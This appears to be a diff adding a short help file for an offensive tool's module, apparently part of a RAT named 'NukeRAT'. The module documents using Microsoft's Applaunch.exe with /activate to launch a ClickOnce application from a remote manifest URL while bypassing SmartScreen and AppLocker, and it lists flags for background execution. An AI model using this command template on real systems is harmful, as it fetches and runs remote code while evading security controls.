@@ -1,0 +1,21 @@
+ABOUT
+    Microsoft .NET ClickOnce Launch Utility.
+    Launches partial-trust ClickOnce apps with /activate, bypassing
+    SmartScreen and default AppLocker where dfsvc would enforce full
+    trust.
+
+USAGE:
+    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
+
+ARGUMENTS:
+    /activate                    Launch ClickOnce application from remote manifest URL
+
+EXAMPLES:
+    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
